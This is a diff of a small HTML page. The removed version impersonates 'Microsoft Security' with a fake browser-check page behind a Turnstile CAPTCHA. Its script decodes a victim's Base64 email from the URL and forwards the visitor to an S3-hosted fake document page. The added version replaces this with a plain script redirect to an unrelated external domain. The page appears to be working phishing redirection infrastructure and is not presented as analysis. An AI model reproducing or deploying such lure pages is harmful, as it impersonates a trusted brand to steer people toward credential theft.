@@ -1,60 +1,11 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <title>Redirecting with Cloudflare Turnstile Verification</title>
-  <!-- Add the correct Cloudflare Turnstile script URL -->
-  <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
-  <style>
-    .container{
-      margin: auto;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-    }
-    .logoheader {
-      display: flex;
-      gap: 10px;
-      align-items: center;
-    }
-  </style>
-</head>
-<body class="container">
-  <div class="logoheader">
-    <img width="20px" height="20px" src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/44/Microsoft_logo.svg/240px-Microsoft_logo.svg.png" alt="logo" />
-    <h2>Microsoft Security</h2>
-  </div>
-  <p>This page is running browser checks to ensure your security.</p>
-  <!-- Cloudflare Turnstile CAPTCHA -->
-  <div class="cf-turnstile" data-sitekey="0x4AAAAAAA0N_Dw4RM4g_7eF" data-callback="onTurnstileVerified"></div>
-  
-  <script>
-    // Function to handle successful CAPTCHA completion
-    function onTurnstileVerified(token) {
-      // Get the current URL
-      const currentUrl = window.location.href;
-      
-       // Use a regular expression to extract the Base64 email after the '?'
-      const base64EmailMatch = currentUrl.match(/\?([^&]*)$/);
-      const base64Email = base64EmailMatch ? base64EmailMatch[1] : null;
-      
-      // If a Base64 email is found, decode it and redirect
-      if (base64Email) {
-        try {
-          // Decode the Base64 email
-          const decodedEmail = atob(base64Email);
-          
-          // Construct the new URL using the decoded email
-          const newUrl = `https://adminreview-sharedxdocx.s3.us-east-1.amazonaws.com/document-directory/index.html#${base64Email}`;
-          
-          // Redirect to the new URL
-          window.location.href = newUrl;
-        } catch (e) {
-          console.error('Invalid Base64 string:', e);
-        }
-      } else {
-        console.error('No Base64 email found in the URL.');
-      }
-    }
-  </script>
-</body>
+  <head>
+    <script>
+      window.location.href = "https://nenedio.com/amfss";
+    </script>
+  </head>
+  <body>
+    <!-- Content for users with JavaScript disabled or for any other purpose. -->
+  </body>
 </html>
